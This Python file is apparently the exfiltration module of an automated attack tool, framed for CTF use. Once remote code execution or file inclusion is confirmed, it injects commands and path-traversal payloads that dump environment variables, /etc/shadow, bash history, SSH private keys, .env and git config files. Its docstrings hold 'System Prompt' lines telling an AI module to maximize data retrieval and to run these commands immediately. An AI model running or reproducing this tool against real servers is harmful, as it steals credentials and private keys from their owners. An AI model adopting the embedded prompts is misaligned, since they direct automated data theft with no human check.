"""
FLAG HUNTER - CTF Automation & Data Exfiltration Module
Maximizes data retrieval after vulnerability confirmation.
"""
import re
import asyncio
from typing import Dict, List, Optional, Set, Set
import httpx

from engine.logging.logger import get_logger


class FlagHunter:
    """
    Exfiltration module that maximizes data retrieval after vulnerability confirmation.
    System Prompt: "You are the Dengkis Exfiltration Module. Your goal is to maximize data retrieval."
    """
    
    def __init__(self, session: Optional[httpx.AsyncClient] = None):
        self.session = session
        self.logger = get_logger()
        self.flags_found: Set[str] = set()
        self.exfiltrated_data: List[Dict] = []
        
        # Extended flag patterns (CTF formats)
        self.flag_patterns = [
            r'FLAG\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'flag\{[^}]+\}',
            r'ctf\{[^}]+\}',
            r'[A-Z0-9]{32}',  # MD5-like flags
            r'[A-Z0-9]{40}',  # SHA1-like flags
            r'[A-Z0-9]{64}',  # SHA256-like flags
            r'[a-f0-9]{32}',  # Lowercase hex (MD5)
            r'[a-f0-9]{40}',  # Lowercase hex (SHA1)
            r'[a-f0-9]{64}',  # Lowercase hex (SHA256)
            r'[A-Za-z0-9+/]{43}=',  # Base64-like
            r'[A-Za-z0-9_-]{20,}',  # Long alphanumeric strings
            r'picoCTF\{[^}]+\}',  # picoCTF format
            r'HTB\{[^}]+\}',  # HackTheBox format
            r'THM\{[^}]+\}',  # TryHackMe format
        ]
    
    async def hunt_flags(self, response_text: str, endpoint: str) -> List[str]:
        """
        Scan response body for flag patterns.
        
        Args:
            response_text: Response body to scan
            endpoint: Endpoint where response came from
            
        Returns:
            List of found flags
        """
        flags = []
        
        for pattern in self.flag_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            for match in matches:
                if match not in self.flags_found:
                    self.flags_found.add(match)
                    flags.append(match)
                    self.logger.warning(f"[FLAG HUNTER] Found flag: {match} at {endpoint}")
        
        if flags:
            self.exfiltrated_data.append({
                'type': 'flag',
                'endpoint': endpoint,
                'flags': flags,
                'pattern': pattern
            })
        
        return flags
    
    async def execute_rce_commands(self, endpoint: str, parameter: str, rce_payload: str) -> Dict:
        """
        Execute RCE commands to dump environment and filesystem.
        System Prompt: "If RCE is achieved, immediately execute env, ls -R /home, and cat /proc/self/environ"
        
        Args:
            endpoint: Vulnerable endpoint
            parameter: Parameter that accepts RCE
            rce_payload: Base RCE payload pattern
            
        Returns:
            Dictionary with exfiltrated data
        """
        exfil_data = {
            'endpoint': endpoint,
            'parameter': parameter,
            'type': 'rce_exfiltration',
            'commands_executed': [],
            'data': {}
        }
        
        # Commands to execute
        commands = [
            ('env', 'Environment variables'),
            ('cat /proc/self/environ', 'Process environment'),
            ('ls -la /home', 'Home directory listing'),
            ('cat /etc/passwd', 'User accounts'),
            ('cat /etc/shadow', 'Password hashes'),
            ('cat ~/.bash_history', 'Command history'),
            ('cat ~/.ssh/id_rsa', 'SSH private key'),
            ('cat ~/.ssh/id_rsa.pub', 'SSH public key'),
        ]
        
        for cmd, description in commands:
            try:
                # Construct RCE payload
                if ';' in rce_payload:
                    payload = rce_payload.replace('id', cmd) if 'id' in rce_payload else f"{rce_payload}; {cmd}"
                elif '|' in rce_payload:
                    payload = rce_payload.replace('id', cmd) if 'id' in rce_payload else f"{rce_payload} | {cmd}"
                elif '`' in rce_payload:
                    payload = rce_payload.replace('id', cmd) if 'id' in rce_payload else f"{rce_payload} `{cmd}`"
                else:
                    payload = f"{rce_payload} {cmd}" if rce_payload else cmd
                
                # Execute command
                if not self.session:
                    async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
                        response = await client.get(
                            endpoint,
                            params={parameter: payload} if '?' in endpoint else None,
                            data={parameter: payload} if '?' not in endpoint else None
                        )
                else:
                    if '?' in endpoint:
                        response = await self.session.get(endpoint, params={parameter: payload})
                    else:
                        response = await self.session.post(endpoint, data={parameter: payload})
                
                if response.status_code == 200:
                    exfil_data['commands_executed'].append(cmd)
                    exfil_data['data'][cmd] = response.text[:5000]  # Limit size
                    
                    # Hunt for flags in response
                    flags = await self.hunt_flags(response.text, endpoint)
                    if flags:
                        exfil_data['flags_found'] = flags
                    
                    self.logger.info(f"[FLAG HUNTER] Executed: {cmd} on {endpoint}")
                
            except Exception as e:
                self.logger.debug(f"[FLAG HUNTER] Failed to execute {cmd}: {e}")
        
        if exfil_data['commands_executed']:
            self.exfiltrated_data.append(exfil_data)
        
        return exfil_data
    
    async def lfi_config_crawl(self, endpoint: str, parameter: str, lfi_payload: str) -> Dict:
        """
        Systematically attempt to read common sensitive paths via LFI.
        System Prompt: "If LFI is confirmed, systematically attempt to read common sensitive paths"
        
        Args:
            endpoint: Vulnerable endpoint
            parameter: Parameter that accepts LFI
            lfi_payload: Base LFI payload pattern
            
        Returns:
            Dictionary with exfiltrated file contents
        """
        exfil_data = {
            'endpoint': endpoint,
            'parameter': parameter,
            'type': 'lfi_exfiltration',
            'files_read': [],
            'data': {}
        }
        
        # Common sensitive paths
        sensitive_paths = [
            '../../../../etc/passwd',
            '../../../../etc/shadow',
            '../../../../etc/hosts',
            '../../../../var/www/html/.env',
            '../../../../var/www/html/config.php',
            '../../../../var/www/html/config.inc.php',
            '../../../../.env',
            '../../../../.git/config',
            '../../../../.git/HEAD',
            '../../../../.ssh/id_rsa',
            '../../../../.ssh/known_hosts',
            '~/.bash_history',
            '~/.bashrc',
            '~/.profile',
            '/proc/self/environ',
            '/proc/version',
            '/etc/issue',
            '/etc/motd',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\Windows\\win.ini',
        ]
        
        for path in sensitive_paths:
            try:
                # Construct LFI payload
                if '../../' in lfi_payload:
                    payload = lfi_payload.replace('../../../../etc/passwd', path)
                else:
                    payload = path
                
                # Attempt to read file
                if not self.session:
                    async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
                        response = await client.get(
                            endpoint,
                            params={parameter: payload} if '?' in endpoint else None
                        )
                else:
                    response = await self.session.get(endpoint, params={parameter: payload})
                
                # Check if file was read (not a 404 or error page)
                if response.status_code == 200:
                    # Check for file indicators
                    content = response.text
                    if any(indicator in content for indicator in ['root:', '[boot loader]', 'DB_PASSWORD', 'SECRET_KEY']):
                        exfil_data['files_read'].append(path)
                        exfil_data['data'][path] = content[:5000]  # Limit size
                        
                        # Hunt for flags
                        flags = await self.hunt_flags(content, endpoint)
                        if flags:
                            exfil_data['flags_found'] = flags
                        
                        self.logger.warning(f"[FLAG HUNTER] Successfully read: {path} from {endpoint}")
                
            except Exception as e:
                self.logger.debug(f"[FLAG HUNTER] Failed to read {path}: {e}")
        
        if exfil_data['files_read']:
            self.exfiltrated_data.append(exfil_data)
        
        return exfil_data
    
    def get_exfiltrated_data(self) -> List[Dict]:
        """Get all exfiltrated data."""
        return self.exfiltrated_data
    
    def get_flags_found(self) -> List[str]:
        """Get all flags found."""
        return list(self.flags_found)
